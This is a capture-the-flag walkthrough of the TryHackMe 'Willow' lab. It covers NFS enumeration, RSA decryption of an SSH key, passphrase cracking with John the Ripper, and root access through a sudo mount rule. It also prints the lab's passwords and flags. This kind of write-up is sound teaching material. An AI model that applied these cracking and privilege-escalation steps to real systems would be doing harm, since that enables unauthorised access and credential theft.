# Walkthrough: TryHackMe - Willow
## Network Reconnaissance & Port Scanning
### 1. Network Connection Setup
Establish the OpenVPN tunnel to access the target environment:
```bash
sudo openvpn ap-south-1-varunkr578-regular.ovpn
```
### 2. Service Discovery
Perform a full-port service and script scan using Nmap against target IP 10.48.155.110
```bash
nmap -sV -sC -p- 10.48.155.110
```
Discovered Open Ports & Services:
- 22/tcp: SSH (```OpenSSH 6.7p1 Debian 5```)
- 80/tcp: HTTP (```Apache httpd 2.4.10```)
- 111/tcp: Rpcbind (```rpcbind 2-4```)
- 2049/tcp: NFS (```NFS v2-4 / rpc.statd```)

---

## Web Application Inspection & Decoding
### 3. HTTP Interface Analysis
Navigating to ```[http://10.48.155.110/](http://10.48.155.110/)``` presents a web page displaying a large hexadecimal-encoded string.

### 4. Hexadecimal Data Transformation
Copying the raw hex stream into CyberChef and applying the From Hex recipe reveals a structured text prompt along with space-delimited decimal integers:
- Extracted Header:
    ```"Hey Willow, here's your SSH Private key -- you know where the decryption key is!"```
- Payload Structure: A long series of space-separated integers representing encrypted key values (```e.g., 2367 2367 2367 2367 2367 9709 8600...```).

---

## NFS Enumeration & Key Extraction
### 5. NFS Share Discovery & Mounting
Query the target NFS service for exported directories:
```bash
showmount -e 10.48.155.110
```
Export List Discovered:
```bash
/var/failsafe *
```
Create a local mount point and attach the remote filesystem:
```bash
mkdir nfs
sudo mount -t nfs 10.48.155.110:/var/failsafe nfs
cd nfs
ls -la
```

### 6. RSA Parameter Inspection
Inspecting the file ```rsa_keys``` inside the mounted share yields the RSA key pair parameters:
```bash
cat rsa_keys
```
Output:
```bash
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```
- Public Exponent ($e$): $23
- $Private Exponent ($d$): $61527
- $Modulus ($n$): $37627

---

## Cryptographic Decryption Analysis
### 7. Decryption Script Implementation
Using Python, map each encrypted integer $c$ back to its ASCII character value using the standard RSA decryption formula:

$$m = c^d \pmod n$$

```bash
# script.py
encrypted = "2367 2367 2367 2367 2367 9709 8600 ..." # Extracted integer sequence

n = 37627
d = 61527

rsakey = ""
for s in encrypted.split(" "):
    if s:
        # Perform modular exponentiation to decrypt each token
        decrypt = pow(int(s), d, n)
        # Convert integer output to ASCII character
        rsakey += chr(decrypt)

print(rsakey)
```
Executing this script processes the integer sequence and reconstructs the plaintext OpenSSH private key formatting.

---

## SSH Key Passphrase Cracking
### 8. Key Formatting & Hash Extraction
After recovering the encrypted RSA private key, assign appropriate restrictive permissions and convert the key into a format readable by John the Ripper using ```ssh2john```:
```bash
chmod 600 id_rsa
ssh2john id_rsa > hashed_sshkey
```
### 9. Passphrase Cracking with John the Ripper
Execute john against the extracted hash using the ```rockyou.txt``` wordlist to reveal the passphrase:
```bash
john hashed_sshkey --wordlist=/usr/share/wordlists/rockyou.txt
```
Cracked Credentials:
```bash
id_rsa:wildflower
```
- SSH Key Passphrase: wildflower

---

## Initial Access & SSH Negotiation Resolution
### 10. SSH Connection & Legacy Cryptography Configuration
Attempting a standard SSH login using the target IP ```10.48.155.110``` fails due to legacy signature algorithm mismatches (```sign_and_send_pubkey: no mutual signature supported```).

To bypass modern SSH client defaults on Kali Linux, explicitly specify the accepted key type using the ```-o PubkeyAcceptedKeyTypes=+ssh-rsa``` option:
```bash
ssh -i id_rsa willow@10.48.155.110 -o PubkeyAcceptedKeyTypes=+ssh-rsa
```
When prompted, enter the key passphrase ```wildflower``` to establish an interactive shell as the user ```willow```.

---

## User Flag Extraction
### 11. Decoding Base64 User Flag Artifact
Upon logging in as ```willow```, the landing directory contains a file named ```user.jpg``` which consists of a long Base64 string rather than binary JPEG data.

Transfer or output the Base64 stream and decode it to recreate the image locally:
```bash
cat user.jpg | base64 --decode > decoded_user.jpg
```
Opening ```decoded_user.jpg``` in an image viewer renders the user flag text.

User Flag:
```bash
THM{beneath_the_weeping_willow_tree}
```
---

## Post-Exploitation Enumeration & Privilege Escalation Vector
### 12. Local System Enumeration
With low-privilege access secured on ```willow-tree```, perform privilege escalation checks:

- SUID Binary Search:
```bash
find / -type f -perm -u=s 2>/dev/null
```
(Standard binaries identified; no immediate uncommon SUID vulnerabilities).
- Sudo Privilege Inspection:
```bash
sudo -l
```
Identified Sudo Configuration:
```bash
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```
### 13. Privilege Escalation Path Analysis
The willow user is authorized to execute /bin/mount /dev/* as root without a password. This allows mounting arbitrary block devices or loop devices with elevated options (or mounting root filesystems/crafted images containing SUID binaries), providing a direct path to full root compromise.

---

## Privilege Escalation via Device Mounting
### 14. Device Enumeration
Inspecting the ```/dev``` directory and searching specifically for block devices reveals a non-standard device named ```/dev/hidden_backup```:
```bash
find /dev -type b
```
Discovered Block Devices:
```bash
/dev/hidden_backup
/dev/xvda3
/dev/xvda2
/dev/xvda1
/dev/xvda
/dev/xvdh
```
### 15. Mounting the Hidden Backup
Exploiting the passwordless sudo entry for ```/bin/mount /dev/*```, create a temporary directory and mount ```/dev/hidden_backup```:
```bash
cd /home/willow
mkdir finding
sudo /bin/mount /dev/hidden_backup /home/willow/finding
```
### 16. Credentials Recovery
Navigating to the mount directory reveals a ```creds.txt``` file containing plain credentials:
```bash
cd finding
cat creds.txt
```
Recovered Credentials:
```bash
root:7qvbvBTvwPspUK
willow:UOZZJLGYhNAT2s
```
- Root Password: ```7qvbvBTvwPspUK```

---

## Steganography & Root Flag Extraction
### 17. Steghide Analysis on Image Artifact
Using the recovered root password (```7qvbvBTvwPspUK```) as a passphrase, extract embedded hidden data from the reconstructed ```user.jpg``` file using steghide:
```bash
steghide extract -sf user.jpg
```
- Passphrase: 7qvbvBTvwPspUK
- Extracted Artifact: root.txt

### 18. Root Flag Retrieval
Output the contents of ```root.txt``` to confirm total target compromise:
```bash
cat root.txt
```
Root Flag:
```bash
THM{find_a_red_rose_on_the_grave}
```
